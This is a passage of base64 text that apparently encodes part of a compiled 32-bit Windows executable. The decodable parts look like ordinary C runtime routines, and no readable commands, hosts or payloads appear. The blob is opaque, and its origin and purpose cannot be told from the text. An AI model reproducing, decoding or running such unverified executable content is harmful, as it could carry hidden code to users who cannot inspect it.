ABZg2X8AItNDOi4AQAAi/CJdeTHRfz+////6BcAAACLxotN8GSJDQAAAABZX15bycIMAIt15ItFEP8w6O8PAABZw2oMaFjJQQDo1pz//4Nl5ACLRQj/MOiLDwAAWYNl/ACLTQzoNAAAAIvwiXXkx0X8/v///+gXAAAAi8aLTfBkiQ0AAAAAWV9eW8nCDACLdeSLRRD/MOiUDwAAWcOL/1WL7IPsDIvBiUX4U1aLAFeLMIX2D4QFAQAAoQTgQQCLyIseg+Efi34EM9iLdggz+DPw08/TztPLO/4PhZ0AAAAr87gAAgAAwf4CO/B3AovGjTwwhf91A2ogXzv+ch1qBFdT6ONTAABqAIlF/OhAEgAAi038g8QQhcl1JGoEjX4EV1Pow1MAAGoAiUX86CASAACLTfyDxBCFyQ+EgAAAAI0EsYvZiUX8jTS5oQTgQQCLffyLz4lF9IvGK8eDwAPB6AI79xvS99Ij0HQSi330M8BAiTmNSQQ7wnX2i338i0X4i0AE/zDozMf//1OJB+jEx///i134iwuLCYkBjUcEUOiyx///iwtWiwmJQQTopcf//4sLg8QQiwmJQQgzwOsDg8j/X15bycOL/1WL7IPsFFOL2VeJXeyLA4s4hf91CIPI/+m3AAAAixUE4EEAi8pWizeD4R+LfwQz8jP6087Tz4X2D4STAAAAg/7/D4SKAAAAiVX8iX30iXX4g+8EO/5yVIsHO0X8dPIzwotV/NPIi8iJF4lF8P8VqGFBAP9V8IsDixUE4EEAi8qD4R+LAIsYi0AEM9rTyzPC08g7XfiJXfCLXex1BTtF9HSvi3Xwi/iJRfTrooP+/3QNVujSEAAAixUE4EEAWYsDiwCJEIsDiwCJUASLA4sAiVAIM8BeX1vJw4v/VYvs/3UIaIDvQQDoWgAAAFlZXcOL/1WL7IPsEGoCjUUIiUX0jU3/WIlF+IlF8I1F+FCNRfRQjUXwUOgG/f//ycOL/1WL7ItNCIXJdQWDyP9dw4sBO0EIdQ2hBOBBAIkBiUEEiUEIM8Bdw4v/VYvsg+wUjUUIiUXsjU3/agKNRQyJRfBYiUX4iUX0jUX4UI1F7FCNRfRQ6AX9///Jw8cF4PNBADjhQQCwAcNogO9BAOiN////xwQkjO9BAOiB////WbABw+gZ+v//sAHDi/9WizUE4EEAVugzDgAAVuiHUgAAVugOVAAAVujq8///VujFx///g8QUsAFew2oA6H6d//9Zw4v/VYvsUWjs80EAjU3/6FQAAACwAcnDi/9W/zXY80EA6IYPAAD/NdzzQQAz9ok12PNBAOhzDwAA/zVk70EAiTXc80EA6GIPAAD/NWjvQQCJNWTvQQDoUQ8AAIPEEIk1aO9BALABXsOL/1WL7FaLdQiDyf+LBvAPwQh1FVe/AOJBADk+dAr/NugfDwAAWYk+X15dwgQAaLhuQQBoOG5BAOgoUQAAWVnDi/9Vi+yAfQgAdBKDPSztQQAAdAXoBxcAALABXcNouG5BAGg4bkEA6GFRAABZWV3Di/9Vi+yLTRCLRQyB4f//9/8jwVaLdQip4Pzw/HQkhfZ0DWoAagDol1YAAFlZiQboMA4AAGoWXokw6GkNAACLxusaUf91DIX2dAnoc1YAAIkG6wXoalYAAFlZM8BeXcNqCGiYyUEA6D2Y///oYCIAAItwDIX2dB6DZfwAi87/FahhQQD/1usHM8BAw4tl6MdF/P7////ogQAAAMyL/1WL7FH/dQjHRfwAAAAAi0X86CEOAABZycOL/1WL7F3pbhgAAIv/VYvsi1UIVoXSdBGLTQyFyXQKi3UQhfZ1F8YCAOiADQAAahZeiTDouQwAAIvGXl3DV4v6K/KKBD6IB0eEwHQFg+kBdfFfhcl1C4gK6FENAABqIuvPM/br0+jUUQAAhcB0CGoW6BdSAABZ9gXo4EEAAnQiahf/FbxgQQCFwHQFagdZzSlqAWgVAABAagPopwoAAIPEDGoD6K3F///Mi/9Vi+xd6Q0NAACL/1WL7PZFCAR1FfZFCAF0HPZFCAJ0DYF9DAAAAIB2DbABXcOBfQz///9/d/MywF3Di/9Vi+yD7CiNTQxTVugI5///hMB0IYt1FIX2dC6D/gJ8BYP+JH4k6J0MAADHABYAAADo1QsAADPbi1UQhdJ0BYtNDIkKXovDW8nDV/91CI1N2OjizP//i0UMM/+JffSJRejrA4tFDIoYQIlFDI1F3FAPtsNqCFCIXfzoBQgAAIPEDIXAdd4PtkUYiUX4gPstdQiDyAKJRfjrBYD7K3UOi30Mih9HiF38iX0M6wOLfQyF9nQFg/4QdXiKwywwPAl3CA++w4PA0OsjisMsYTwZdwgPvsODwKnrE4rDLEE8GXcID77Dg8DJ6wODyP+FwHQJhfZ1PWoKXus4igdHiEXwiX0MPHh0GzxYdBeF9nUDaghe/3XwjU0M6BEHAACLfQzrEIX2dQNqEF6KH0eIXfyJfQwz0oPI//f2iVXsi1X4iUXwjUvQgPkJdwgPvsuDwdDrI4rDLGE8GXcID77Lg8Gp6xOKwyxBPBl3CA++y4PByesDg8n/g/n/dDE7znMti0X0i13wO8NyC3UFO03sdgRqDOsKD6/GaggDwYlF9IofR1iIXfwL0Il9DOuX/3X8jU0MiVX46HUGAACLXfj2wwh1CotF6DPbiUUM60GLffRXU+j7/f//WVmEwHQo6OoKAADHACIAAAD2wwF1BYPP/+sa9sMCdAe7AAAAgOsQu////3/rCfbDAnQC99+L34B95ABfD4Qj/v//i0XYg6BQAwAA/ekU/v//i/9Vi+yB7KAAAACNTQxTV+jg5P//hMB0IYt9FIX/dC6D/wJ8BYP/JH4k6HUKAADHABYAAADorQkAADPbi1UQhdJ0BYtNDIkKX4vDW8nDVv91CI2NYP///+i3yv//i0UMM/aJdfyJhXD////rA4tFDA+3MIPAAmoIVolFDOggVgAAWVmFwHXmD7ZdGGaD/i11BYPLAusGZoP+K3UOi1UMD7cyg8ICiVUM6wOLVQzHhXT///86AAAAuBD/AADHRfhgBgAAx0X0agYAAMdF8PAGAADHRez6BgAAx0XoZgkAAMdF5HAJAADHReDmCQAAx0Xc8AkAAMdF2GYKAADHRdRwCgAAx0XQ5goAAMdFzPAKAADHRchmCwAAx0XEcAsAAMdFwGYMAADHRbxwDAAAx0W45gwAAMdFtPAMAADHRbBmDQAAx0WscA0AAMdFqFAOAADHRaRaDgAAx0Wg0A4AAMdFnNoOAADHRZggDwAAx0WUKg8AAMdFkEAQAADHRYxKEAAAx0WI4BcAAMdFhOoXAADHRYAQGAAAx4V8////GhgAAMeFeP///xr/AABqMFmF/3QJg/8QD4XtAQAAZjvxD4JvAQAAZju1dP///3MKD7fGK8HpVwEAAGY78A+DOAEAAItN+GY78Q+CRwEAAGY7dfRy24tN8GY78Q+CNQEAAGY7dexyyYtN6GY78Q+CIwEAAGY7deRyt4tN4GY78Q+CEQEAAGY7ddxypYtN2GY78Q+C/wAAAGY7ddRyk4tN0GY78Q+C7QAAAGY7dcxygYtNyGY78Q+C2wAAAGY7dcQPgmv///+LTcBmO/EPgsUAAABmO3W8D4JV////i024ZjvxD4KvAAAAZjt1tA+CP////4tNsGY78Q+CmQAAAGY7dawPgin///+LTahmO/EPgoMAAABmO3WkD4IT////i02gZjvxcnFmO3WcD4IB////i02YZjvxcl9mO3WUD4Lv/v//i02QZjvxck1mO3WMD4Ld/v//i02IZjvxcjtmO3WED4LL/v//i02AZjvxcilmO7V8////cyDptf7//2Y7tXj///9zCg+3xi0Q/wAA6wODyP+D+P91Kg+3xoP4QXIKg/hadwWNSJ/rCI1In4P5GXcNg/kZdwODwOCDwMnrA4PI/4XAdAyF/3VDagpfiX0U6zsPtwKNSgKJTQyD+Hh0GoP4WHQVhf91BmoIX4l9FFCNTQzooAIAAOsThf91BmoQX4l9FA+3MY1RAolVDIPI/zPS9/eL+GowWWY78Q+CbQEAAGo6WGY78HMKD7fGK8HpVgEAALkQ/wAAZjvxD4M4AQAAi034ZjvxD4JBAQAAZjt19HLWi03wZjvxD4IvAQAAZjt17HLEi03oZjvxD4IdAQAAZjt15HKyi03gZjvxD4ILAQAAZjt13HKgi03YZjvxD4L5AAAAZjt11HKOi03QZjvxD4LnAAAAZjt1zA+CeP///4tNyGY78Q+C0QAAAGY7dcQPgmL///+LTcBmO/EPgrsAAABmO3W8D4JM////i024ZjvxD4KlAAAAZjt1tA+CNv///4tNsGY78Q+CjwAAAGY7dawPgiD///+LTahmO/FyfWY7daQPgg7///+LTaBmO/Fya2Y7dZwPgvz+//+LTZhmO/FyWWY7dZQPgur+//+LTZBmO/FyR2Y7dYwPgtj+//+LTYhmO/FyNWY7dYQPgsb+//+LTYBmO/FyI2Y7tXz///9zGumw/v//Zju1eP///w+Co/7//4PI/4P4/3UqD7fGg/hBcgqD+Fp3BY1In+sIjUifg/kZdw2D+Rl3A4PA4IPAyesDg8j/g/j/dDU7RRRzMItN/DvPcgp1BDvCdgRqDOsLD69NFGoIA8iJTfyLTQxYD7cxg8ECiU0MC9jpI/7//1aNTQzonAAAAPbDCHUNi4Vw////M9uJRQzrQYt1/FZT6Pn3//9ZWYTAdCjo6AQAAMcAIgAAAPbDAXUFg87/6xr2wwJ0B7sAAACA6xC7////f+sJ9sMCdAL33ovegL1s////AF4PhEb6//+LhWD///+DoFADAAD96TT6//+L/1WL7IsBSIkBik0IhMl0FDgIdBDoggQAAMcAFgAAAOi6AwAAXcIEAIv/VYvsiwGDwP6JAWaLTQhmhcl0FWY5CHQQ6FQEAADHABYAAADojAMAAF3CBACL/1WL7ItNEFaFyXQwi1UIizGNQgE9AAEAAHcLiwYPtwRQI0UM6yqDfgQBfgxR/3UMUuh0UAAA6xUzwOsU/3UM/3UI6NdAAABQ6Cri//+DxAxeXcPMzMzMzFNWi0wkDItUJBCLXCQU98P/////dFAryvfCAwAAAHQXD7YEEToCdUiFwHQ6QoPrAXY09sIDdemNBBEl/w8AAD38DwAAd9qLBBE7AnXTg+sEdhSNsP/+/v6DwgT30CPGqYCAgIB00TPAXlvD6wPMzMwbwIPIAV5bw4v/VYvsi0UQhcB1Al3Di00Mi1UIVoPoAXQVD7cyZoX2dA1mOzF1CIPCAoPBAuvmD7cCD7cJK8FeXcOL/1ZXv5jvQQAz9moAaKAPAABX6D8HAACFwHQY/wXo8EEAg8YYg8cYgf5QAQAActuwAesKagDoHQAAAFkywF9ew4v/VYvsa0UIGAWY70EAUP8V6GBBAF3Di/9WizXo8EEAhfZ0IGvGGFeNuIDvQQBX/xXwYEEA/w3o8EEAg+8Yg+4BdetfsAFew4v/VYvsa0UIGAWY70EAUP8V7GBBAF3Di/9Vi+xRZKEwAAAAVjP2iXX8i0AQOXAIfA+NRfxQ6LkEAACDffwBdAMz9kaLxl7Jw4v/VYvsgewoAwAAoQTgQQAzxYlF/IN9CP9XdAn/dQjoJIz//1lqUI2F4Pz//2oAUOiIkv//aMwCAACNhTD9//9qAFDodZL//42F4Pz//4PEGImF2Pz//42FMP3//4mF3Pz//4mF4P3//4mN3P3//4mV2P3//4md1P3//4m10P3//4m9zP3//2aMlfj9//9mjI3s/f//ZoydyP3//2aMhcT9//9mjKXA/f//ZoytvP3//5yPhfD9//+LRQSJhej9//+NRQSJhfT9///HhTD9//8BAAEAi0D8iYXk/f//i0UMiYXg/P//i0UQiYXk/P//i0UEiYXs/P///xXUYEEAagCL+P8VtGBBAI2F2Pz//1D/FbBgQQCFwHUThf91D4N9CP90Cf91COgdi///WYtN/DPNX+hmgv//ycOL/1WL7ItFCKPs8EEAXcOL/1WL7Fbo2RYAAIXAdCmLsFwDAACF9nQf/3UY/3UU/3UQ/3UM/3UIi87/FahhQQD/1oPEFF5dw/91GIs1BOBBAIvO/3UUMzXs8EEAg+Ef/3UQ087/dQz/dQiF9nXK6BEAAADMM8BQUFBQUOiQ////g8QUw2oX/xW8YEEAhcB0BWoFWc0pVmoBvhcEAMBWagLoI/7//4PEDFb/FXxgQQBQ/xW4YEEAXsOL/1WL7ItNCDPAOwzFuG5BAHQnQIP4LXLxjUHtg/gRdwVqDVhdw42BRP///2oOWTvIG8AjwYPACF3DiwTFvG5BAF3Di/9Vi+xW6BgAAACLTQhRiQjop////1mL8OgYAAAAiTBeXcPo0RUAAIXAdQa49OBBAMODwBTD6L4VAACFwHUGuPDgQQDDg8AQw4v/VYvsVot1CIX2dAxq4DPSWPf2O0UMcjQPr3UMhfZ1F0brFOiP7P//hcB0IFbo80IAAFmFwHQVVmoI/zUE9EEA/xWgYEEAhcB02esN6Jv////HAAwAAAAzwF5dw4v/VYvsg30IAHQt/3UIagD/NQT0QQD/FaxgQQCFwHUYVuhq////i/D/FaRgQQBQ6OP+//9ZiQZeXcNooHRBAGiYdEEAaKB0QQBqAej/AAAAg8QQw2gEdUEAaPx0QQBoBHVBAGoU6OUAAACDxBDDaBx1QQBoFHVBAGgcdUEAahboywAAAIPEEMOL/1WL7FFTVleLfQjpogAAAIsfjQSd8PBBAIswiUX8kIX2dAuD/v8PhIMAAADrfYscnSBwQQBoAAgAAGoAU/8VDGFBAIvwhfZ1UP8VpGBBAIP4V3U1agdoOGxBAFPoMvv//4PEDIXAdCFqB2iIdEEAU+ge+///g8QMhcB0DVZWU/8VDGFBAIvw6wIz9oX2dQqLTfyDyP+HAesWi038i8aHAYXAdAdW/xUIYUEAhfZ1E4PHBDt9DA+FVf///zPAX15bycOLxuv3i/9Vi+yLRQhTV40chUDxQQCLA5CLFQTgQQCDz/+LyjPQg+Ef08o713UEM8DrUYXSdASLwutJVv91FP91EOj3/v//WVmFwHQd/3UMUP8VeGBBAIvwhfZ0DVboWLT//1mHA4vG6xmhBOBBAGogg+AfWSvI088zPQTgQQCHOzPAXl9bXcOL/1WL7FZoNHVBAGgwdUEAaDR1QQBqHOhh////i/CDxBCF9nQR/3UIi85q+v8VqGFBAP/W6wW4JQIAwF5dwgQAi/9Vi+xW6B3+//+L8IX2dCf/dSiLzv91JP91IP91HP91GP91FP91EP91DP91CP8VqGFBAP/W6yD/dRz/dRj/dRT/dRD/dQxqAP91COjyAQAAUP8VNGFBAF5dwiQAi/9Vi+xWaLh0QQBosHRBAGhQbEEAagPoxP7//4vwg8QQhfZ0D/91CIvO/xWoYUEA/9brBv8V+GBBAF5dwgQAi/9Vi+xWaMB0QQBouHRBAGhkbEEAagTohf7//4vwg8QQhfZ0Ev91CIvO/xWoYUEA/9ZeXcIEAF5d/yUEYUEAi/9Vi+xWaMh0QQBowHRBAGh0bEEAagXoRv7//4vwg8QQhfZ0Ev91CIvO/xWoYUEA/9ZeXcIEAF5d/yX8YEEAi/9Vi+xWaNB0QQBoyHRBAGiIbEEAagboB/7//4vwg8QQhfZ0Ff91DIvO/3UI/xWoYUEA/9ZeXcIIAF5d/yUAYUEAi/9Vi+xWaNR0QQBo0HRBAGjUdEEAag3oxf3//4vwg8QQhfZ0Ev91CIvO/xWoYUEA/9ZeXcIEAF5d/yXMYEEAi/9Vi+xWaPx0QQBo9HRBAGicbEEAahLohv3//4vwg8QQhfZ0Ff91EIvO/3UM/3UI/xWoYUEA/9brDP91DP91CP8V9GBBAF5dwgwAi/9Vi+xW6FH8//+L8IX2dCf/dSiLzv91JP91IP91HP91GP91FP91EP91DP91CP8VqGFBAP/W6yD/dRz/dRj/dRT/dRD/dQxqAP91COgMAAAAUP8VOGFBAF5dwiQAi/9Vi+xW6A78//+L8IX2dBL/dQyLzv91CP8VqGFBAP/W6wn/dQjokUgAAFleXcIIALnI8UEAuEDxQQAz0jvIVos1BOBBABvJg+Heg8EiQokwjUAEO9F19rABXsOL/1WL7IB9CAB1J1a+8PBBAIM+AHQQgz7/dAj/Nv8VCGFBAIMmAIPGBIH+QPFBAHXgXrABXcNqEGi4yUEA6OGE//+DZeQAagjomff//1mDZfwAagNeiXXgOzUo7UEAdFmhLO1BAIsEsIXAdEqLQAyQwegNqAF0FqEs7UEA/zSw6H9IAABZg/j/dAP/ReShLO1BAIsEsIPAIFD/FfBgQQChLO1BAP80sOij+v//WaEs7UEAgySwAEbrnMdF/P7////oEwAAAItF5ItN8GSJDQAAAABZX15bycNqCOhP9///WcNqCGjYyUEA6DaE//+LRQj/MOgFtP//WYNl/ACLdQz/dgSLBv8w6FsBAABZWYTAdDKLRgiAOAB1DosGiwCLQAyQ0eioAXQciwb/MOjzAQAAWYP4/3QHi0YE/wDrBotGDIMI/8dF/P7////oEgAAAItN8GSJDQAAAABZX15bycIMAItFEP8w6KWz//9Zw2osaPjJQQDoqoP//4tFCP8w6GP2//9Zg2X8AIs1LO1BAKEo7UEAjRyGi30MiXXUO/N0T4sGiUXg/zdQ6LkAAABZWYTAdDeLVwiLTwSLB4194Il9xIlFyIlNzIlV0ItF4IlF3IlF2I1F3FCNRcRQjUXYUI1N5+j6/v//i30Mg8YE66rHRfz+////6BIAAACLTfBkiQ0AAAAAWV9eW8nCDACLRRD/MOgX9v//WcOL/1WL7IPsIINl+ACNRfiDZfQAjU3/iUXgjUUIiUXkjUX0agiJRehYiUXwiUXsjUXwUI1F4FCNRexQ6BX///+AfQgAi0X4dQOLRfTJw4v/VYvsi0UIhcB0H4tIDJCLwcHoDagBdBJR6BQAAACDxASEwHUJi0UM/wAywF3DsAFdw4v/VYvsi0UIJAM8AnUG9kUIwHUJ90UIAAgAAHQEsAFdwzLAXcOL/1WL7ItNCFZXjXEMixaQi8IkAzwCdUf2wsB0Qos5i0EEK/iJAYNhCACF/34xV1BR6OIZAABZUOgkTwAAg8QMO/h0C2oQWPAJBoPI/+sSiwaQwegCqAF0Bmr9WPAhBjPAX15dw4v/VYvsVot1CIX2dQlW6OP+//9Z6y9W6H////9ZhcB1IYtGDJDB6AuoAXQSVuiBGQAAUOjORgAAWVmFwHUEM8DrA4PI/15dw2oB6Kf+//9Zw4v/VYvsVot1CFeNfgyLB5DB6A2oAXQliweQwegGqAF0G/92BOiy9///Wbi//v//8CEHM8CJRgSJBolGCF9eXcOL/1WL7IPsSI1FuFD/FdhgQQBmg33qAA+ElwAAAFOLXeyF2w+EigAAAFaLM41DBAPGiUX8uAAgAAA78HwCi/BW6F4vAAChyPNBAFk78H4Ci/BXM/+F9nRZi0X8iwiD+f90RIP5/nQ/ilQfBPbCAXQ29sIIdQtR/xU8YUEAhcB0I4vHi8+D4D/B+QZr0DiLRfwDFI3I8UEAiwCJQhiKRB8EiEIoi0X8R4PABIlF/Dv+dapfXlvJw4v/U1ZXM/+Lx4vPg+A/wfkGa/A4AzSNyPFBAIN+GP90DIN+GP50BoBOKIDreYvHxkYogYPoAHQQg+gBdAeD6AFq9OsGavXrAmr2WFD/FSBhQQCL2IP7/3QNhdt0CVP/FTxhQQDrAjPAhcB0HA+2wIleGIP4AnUGgE4oQOspg/gDdSSATigI6x6ATihAx0YY/v///6Es7UEAhcB0CosEuMdAEP7///9Hg/8DD4VX////X15bw2oMaBjKQQDo+X///2oH6LXy//9ZM9uIXeeJXfxT6BcuAABZhcB1D+hq/v//6Bv///+zAYhd58dF/P7////oFQAAAIrDi03wZIkNAAAAAFlfXlvJw4pd52oH6LLy//9Zw4v/VjP2i4bI8UEAhcB0DlDojy0AAIOmyPFBAABZg8YEgf4AAgAAct2wAV7Di/9Vi+xWi3UIg/7gdzCF9nUXRusU6Obh//+FwHQgVuhKOAAAWYXAdBVWagD/NQT0QQD/FaBgQQCFwHTZ6w3o8vT//8cADAAAADPAXl3Di/9Vi+yLRQiLTRCLVQyJEIlIBIXJdAKJEV3Di/9Vi+xRagH/dRBRUYvE/3UM/3UIUOjK////g8QMagDo3uf//4PEFMnDi/9Vi+xRagH/dRBRUYvE/3UM/3UIUOig////g8QMagDo2en//4PEFMnDi/9Vi+yD7BBTV4t9DIX/D4QZAQAAi10QhdsPhA4BAACAPwB1FYtFCIXAD4QMAQAAM8lmiQjpAgEAAFb/dRSNTfDoorT//4tF9IF4COn9AAB1IWjM80EAU1f/dQjokU4AAIvwg8QQhfYPiasAAADpowAAAIO4qAAAAAB1FYtNCIXJdAYPtgdmiQEz9kbpiAAAAI1F9FAPtgdQ6O5NAABZWYXAdEKLdfSDfgQBfik7XgR8JzPAOUUID5XAUP91CP92BFdqCf92COjjJgAAi3X0g8QYhcB1CzteBHIwgH8BAHQqi3YE6zMzwDlFCA+VwDP2UP91CItF9EZWV2oJ/3AI6KsmAACDxBiFwHUO6Gjz///HACoAAACDzv+AffwAdAqLTfCDoVADAAD9i8Ze6xCDJczzQQAAgyXQ80EAADPAX1vJw4v/VYvsagD/dRD/dQz/dQjoqf7//4PEEF3Di/9Vi+yD7BhXi30Mhf91FTl9EHYQi0UIhcB0AiE4M8DpugAAAFOLXQiF23QDgwv/gX0Q////f1Z2FOjd8v//ahZeiTDoFvL//+mNAAAA/3UYjU3o6DOz//+LRewz9otICIH56f0AAHUsjUX4iXX4UA+3RRRQV4l1/OhTTgAAg8QMhdt0AokDg/gEfj/oi/L//4sw6zY5sKgAAAB1XGaLRRS5/wAAAGY7wXY3hf90Ejl1EHYN/3UQVlfosoL//4PEDOhW8v//aipeiTCAffQAdAqLTeiDoVADAAD9i8ZeW1/Jw4X/dAc5dRB2XIgHhdt02scDAQAAAOvSjUX8iXX8UFb/dRCNRRRXagFQVlHoUxUAAIPEIIXAdA05dfx1o4XbdKmJA+ul/xWkYEEAg/h6dZCF/3QSOXUQdg3/dRBWV+gsgv//g8QM6NDx//9qIl6JMOgJ8f//6XD///+L/1WL7GoA/3UU/3UQ/3UM/3UI6I3+//+DxBRdw4v/VYvsoWzsQQBWV4P4BXx6i3UIi9aLfQyD4h9qIFgrwvfaG9Ij0Dv6cwKL140MMovGO/F0CoA4AHQFQDvBdfaLyCvOO8oPhdAAAAAr+ovIg+fgA/jF8e/JO8d0E8X1dAHF/dfAhcB1B4PBIDvPde2LRQwDxusGgDkAdAVBO8h19ivOxfh36ZEAAACD+AF8cot1CIvWi30Mg+IPahBYK8L32hvSI9A7+nMCi9eNDDKLxjvxdAqAOAB0BUA7wXX2i8grzjvKdVUr+ovIg+fwD1fJA/g7x3QWDxABZg90wWYP18CFwHUHg8EQO8916otFDAPG6waAOQB0BUE7yHX2K87rGotVCIvKi0UMA8I70HQKgDkAdAVBO8h19ivKX4vBXl3Di/9Vi+yhbOxBAFZXg/gFD4y3AAAAi00I9sEBdCGLRQyL8Y0UQTvydA4zwGY5AXQHg8ECO8p19CvO6WoBAACL0YPiH2ogWCvC99ob0iPQi0UM0eo7wnMCi9CLdQiNPFEzwDv3dAxmOQF0B4PBAjvPdfQrztH5O8oPhS0BAACLRQyNPE4rwoPg4APBxfHvyY0MRusPxfV1B8X918CFwHUHg8cgO/l17YtFDI0MRjv5dA4zwGY5B3QHg8cCO/l19IvPK87R+cX4d+neAAAAg/gBD4y0AAAAi00I9sEBdCeLRQyL8Y0UQTvyD4RK////M8BmOQEPhD////+DwQI7ynXw6TP///+L0YPiD2oQWCvC99ob0iPQi0UM0eo7wnMCi9CLdQiNPFEzwDv3dAxmOQF0B4PBAjvPdfQrztH5O8p1a4tFDI08TivCD1fJg+DwA8GNDEbrEg8QB2YPdcFmD9fAhcB1B4PHEDv5deqLRQyNDEY7+XQOM8BmOQd0B4PHAjv5dfSLz+mu/v//i1UIi8qLRQyNNEI71nQOM8BmOQF0B4PBAjvOdfQrytH5X4vBXl3DaghoOMpBAOgKef//i0UI/zDow+v//1mDZfwAi0UMiwCLAItASPD/AMdF/P7////oEgAAAItN8GSJDQAAAABZX15bycIMAItFEP8w6NHr//9Zw2oIaHjKQQDouHj//4tFCP8w6HHr//9Zg2X8AItFDIsAiwCLSEiFyXQYg8j/8A/BAXUPgfkA4kEAdAdR6LDu//9Zx0X8/v///+gSAAAAi03wZIkNAAAAAFlfXlvJwgwAi0UQ/zDoZuv//1nDaghomMpBAOhNeP//i0UI/zDoBuv//1mDZfwAagCLRQyLAP8w6A0CAABZWcdF/P7////oEgAAAItN8GSJDQAAAABZX15bycIMAItFEP8w6BHr//9Zw2oIaFjKQQDo+Hf//4tFCP8w6LHq//9Zg2X8AItNDItBBIsA/zCLAf8w6LMBAABZWcdF/P7////oEgAAAItN8GSJDQAAAABZX15bycIMAItFEP8w6Lfq//9Zw4v/VYvsg+wUi0UIM8lBakOJSBiLRQjHAJhtQQCLRQiJiFADAACLRQhZagXHQEgA4kEAi0UIZolIbItFCGaJiHIBAACNTf+LRQiDoEwDAAAAjUUIiUXwWIlF+IlF7I1F+FCNRfBQjUXsUOgm/v//jUUIiUX0jU3/agSNRQyJRfhYiUXsiUXwjUXsUI1F9FCNRfBQ6A/////Jw4v/VYvsg30IAHQS/3UI6A4AAAD/dQjoIu3//1lZXcIEAIv/VYvsi0UIg+wQiwiB+ZhtQQB0ClHoAe3//4tFCFn/cDzo9ez//4tFCP9wMOjq7P//i0UI/3A06N/s//+LRQj/cDjo1Oz//4tFCP9wKOjJ7P//i0UI/3As6L7s//+LRQj/cEDos+z//4tFCP9wROio7P//i0UI/7BgAwAA6Jrs//+DxCSNRQiJRfSNTf9qBViJRfiJRfCNRfhQjUX0UI1F8FDohP3//2oEjUUIiUX0jU3/WIlF8IlF+I1F8FCNRfRQjUX4UOjM/f//ycOL/1WL7FaLdQiDfkwAdCj/dkzofywAAItGTFk7BeDzQQB0FD044UEAdA2DeAwAdQdQ6JUqAABZi0UMiUZMXoXAdAdQ6AYqAABZXcOL/1NWV/8VpGBBAIvwoTDhQQCD+P90HFDo1O7//4v4hf90C4P//3V4M9uL++t0oTDhQQBq/1Do9e7//4XAdOloZAMAAGoB6Fzr//+L+FlZhf91FzPbU/81MOFBAOjP7v//U+id6///WevAV/81MOFBAOi67v//hcB1ETPbU/81MOFBAOio7v//V+vXaODzQQBX6Jj9//9qAOhn6///g8QMi99W/xXkYEEA998b/yP7dAaLx19eW8Poj93//8yhMOFBAFaD+P90GFDoI+7//4vwhfZ0B4P+/3R4626hMOFBAGr/UOhI7v//hcB0ZWhkAwAAagHor+r//4vwWVmF9nUVUP81MOFBAOgk7v//Vujy6v//Wes8Vv81MOFBAOgP7v//hcB1D1D/NTDhQQDo/+3//1br2Wjg80EAVujv/P//agDovur//4PEDIX2dASLxl7D6PXc///Mi/9TVlf/FaRgQQCL8KEw4UEAg/j/dBxQ6H3t//+L+IX/dAuD//91eDPbi/vrdKEw4UEAav9Q6J7t//+FwHTpaGQDAABqAegF6v//i/hZWYX/dRcz21P/NTDhQQDoeO3//1PoRur//1nrwFf/NTDhQQDoY+3//4XAdREz21P/NTDhQQDoUe3//1fr12jg80EAV+hB/P//agDoEOr//4PEDIvfVv8V5GBBAPffG/8j+4vHX15bw2gPr0AA6F3s//+jMOFBAIP4/3UDMsDD6C////+FwHUJUOgGAAAAWevrsAHDoTDhQQCD+P90DVDoauz//4MNMOFBAP+wAcOL/1WL7FaLdQyLBjsF4PNBAHQXi00IoYDnQQCFgVADAAB1B+hSKgAAiQZeXcOL/1WL7FaLdQyLBjsF7PNBAHQXi00IoYDnQQCFgVADAAB1B+idGQAAiQZeXcOL/1WL7ItFCDPJVle+/wcAAIs4i1AEi8LB6BQjxjvGdTuL8ovHgeb//w8AC8Z1A0DrLLgAAAgAO9F/E3wEO/lzDTv5dQk78HUFagRY6xAj0AvKdARqAuvzagPr7zPAX15dw4v/VYvsg+w4M8BXi30chf95Aov4U1aLdQyNTcj/dSiIBujQqP//jUcLOUUQdxToU+j//2oiX4k46Izn///pwAIAAItdCItLBIvBixPB6BQl/wcAAD3/BwAAdVAzwFD/dSRQV/91GP91FP91EFZT6KYCAACL+IPEJIX/dAjGBgDpfgIAAGplVuiunAAAWVmFwHQSik0ggPEBwOEFgMFQiAjGQAMAM//pVwIAADPAO8h/DXwEO9BzB8YGLUaLSwSKRSCNVgE0AcdF8P8DAACIRf+B4QAA8H8PtsDB4AWDwAeJVdyJReQzwAvBajBYdR6IBotDBIsLJf//DwALyHUFiU3w6w7HRfD+AwAA6wPGBjEzyY1yAYl19IX/dQSKwesNi0XMi4CIAAAAiwCKAIgCi0MEJf//DwCJRex3CDkLD4bEAAAAajCL0bkAAA8AWIlF+IlV9IlN7IX/flCLAyPCi1MEI9GLTfiB4v//DwAPv8nohpgAAGowWWYDwQ+3wIP4OXYDA0Xki1X0i03sD6zKBIgGRotF+MHpBIPoBE+JVfSJTeyJRfhmhcB5rIl19GaFwHhViwMjwotTBCPRi034geL//w8AD7/J6C6YAABmg/gIdjVqMI1G/1uKCID5ZnQFgPlGdQWIGEjr74tdCDtF3HQTgPk5dQiLTeSAwTrrAv7BiAjrA/5A/4X/fhNXajBYUFboxHb//4PEDAP3iXX0i0XcgDgAdQWL8Il19IpF/7E0wOAFBFCIBosDi1ME6LmXAACLyDP2i0X0geH/BwAAK03wG/aNUAKJVdx4Cn8EhclyBLMr6wr32Wotg9YA995biFgBi/pqMFiIAjPAO/B8KLvoAwAAfwQ7y3IdU1BTVlHohpUAAIvzW5CJVeQEMItV3IgCjXoBM8A7+nULO/B8I38Fg/lkchxTUGpkVlHoWZUAAIvzW5AEMIlV5ItV3IgHRzPAO/p1CzvwfB5/BYP5CnIXU1BqClZR6C6VAABbkAQwiVXciAdHM8CAwTCID4hHAYv4gH3UAF5bdAqLTciDoVADAAD9i8dfycOL/1WL7IPsDFaLdRxXjX4BjUcCO0UYcgOLRRhQ/3UUjUX0UItFCFf/cAT/MOgoRwAAg8n/g8QYOU0QdBeLTRAzwIN99C0PlMAryDPAhfYPn8AryI1F9FBXi30MUTPJg330LQ+UwTPAhfYPn8ADzwPBUOiBQQAAg8QQhcB0BcYHAOsc/3UojUX0agBQ/3Uk/3UgVv91EFfoBwAAAIPEIF9eycOL/1WL7IPsEFZXi30Qhf9+BIvH6wIzwIPACTlFDHcV6Kfk//9qIl6JMOjg4///i8ZfXsnDU/91JI1N8Oj7pP//ilUgi10IhNJ0JYtNHDPAhf8Pn8BQM8CDOS0PlMADw1D/dQxT6JEDAACKVSCDxBCLRRyL84M4LXUGxgMtjXMBhf9+FYpGAYgGRotF9IuAiAAAAIsAigCIBg+2woPwAQPHA/CDyP85RQx0B4vDK8YDRQxo4H